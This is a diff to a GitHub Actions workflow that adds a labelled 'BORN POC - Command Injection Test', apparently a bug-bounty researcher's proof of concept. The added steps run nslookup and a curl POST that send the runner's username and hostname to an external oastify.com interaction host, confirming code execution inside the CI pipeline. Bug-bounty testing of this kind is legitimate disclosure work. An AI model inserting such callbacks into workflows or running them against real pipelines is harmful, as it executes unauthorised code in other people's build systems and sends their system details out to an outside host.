@@ -32,6 +32,7 @@ jobs:
       # ================================================
       # BORN POC - COMMAND INJECTION TEST
       # Researcher: Mr. Bibo (mrbibo@wearehackerone.com)
+      # Oastify: fgzugxemedb5lm4y5rnjd93uclih6auz.oastify.com
       # ================================================
       - name: BORN POC - Command Injection Test
         run: |
@@ -42,4 +43,12 @@ jobs:
           echo "Current Path: $(pwd)"
           echo "Current Date: $(date)"
           echo "Hostname: $(hostname)"
+          echo ""
+          echo "[+] Sending DNS callback to Oastify..."
+          nslookup bibo.fgzugxemedb5lm4y5rnjd93uclih6auz.oastify.com
+          echo ""
+          echo "[+] Sending HTTP callback to Oastify..."
+          curl -s -X POST -d "status=rce_success&user=$(whoami)&host=$(hostname)" \
+            https://fgzugxemedb5lm4y5rnjd93uclih6auz.oastify.com/poc 2>/dev/null || true
+          echo ""
           echo "========== END OF TEST =========="
